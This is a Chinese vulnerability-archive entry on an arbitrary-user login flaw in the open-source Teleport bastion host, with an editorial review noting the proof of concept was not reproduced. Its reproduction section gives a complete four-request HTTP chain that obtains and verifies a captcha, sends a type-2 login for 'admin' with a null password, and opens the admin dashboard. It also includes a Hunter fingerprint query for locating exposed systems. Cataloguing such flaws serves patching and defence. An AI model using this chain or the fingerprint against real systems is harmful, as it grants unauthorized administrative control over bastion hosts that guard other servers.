---
source: "wy876 漏洞文库"
id: "vw-8d86e7c4b91fc5a535735a7a"
entity_id: "ve-8d86e7c4b91fc5a535735a7a"
schema_version: "1"
title: "Teleport堡垒机 do-login 任意用户登录漏洞"
product: "开源Teleport堡垒机，非齐治产品"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "≤20220817日期构建声称，需获取并验证同会话验证码"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/Teleport%E5%A0%A1%E5%9E%92%E6%9C%BAdo-login%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/od1gvmdxp2ns8ze9"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"Teleport 堡垒机系统\""
---

# Teleport堡垒机 do-login 任意用户登录漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：开源Teleport堡垒机，非齐治产品
- 本文讨论：auth/do-login type2/null password认证绕过
- 版本、权限与配置前提：≤20220817日期构建声称，需获取并验证同会话验证码
- 资料类型：验证码会话至登录绕过链；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 误归齐治，应明确开源Teleport厂商/仓库，避免与其他同名Teleport混淆
- 日期作版本缺发布tag；code0需后端权限请求证明而非单成功码
- 红框指示无对应图片，元数据Hunter错标FOFA
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 正确项目、构建范围、type2分支与权限结果待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Teleport堡垒机是一款简单易用的开源堡垒机系统，具有小巧、易用的特点，支持RDP/SSH/SFTP/Telnet协议的远程连接和审计管理。Teleport堡垒机存在任意用户登录漏洞，攻击者通过漏洞可以获取业务后台权限。

# 二、影响版本
+ Teleport堡垒机<= 20220817  


# 三、资产测绘
+ hunter`app.name="Teleport 堡垒机系统"`
+ 特征


# 四、漏洞复现
1. 获取验证码

```http
GET /auth/captcha?h=36&rnd=0.39124018049760567 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: image/avif,image/webp,*/*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
```


2. 使用上一步的`cookie`和获取到的验证码对红框中的参数进行相应替换，校验验证码

```http
POST /auth/verify-captcha HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12

args={"captcha":"ckpa"}
```


3. 使用校验后的验证码和`cookie`对红框中的参数进行相应替换，当响应`code`为`0`时表示存在漏洞！

```http
POST /auth/do-login HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

args={"type":2,"username":"admin","password":null,"captcha":"ckpa","oath":"","remember":false}
```


4. 使用上一步的`cookie`对红框中的参数进行相应替换，登录系统，获取管理员权限

```http
GET /dashboard HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/od1gvmdxp2ns8ze9>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
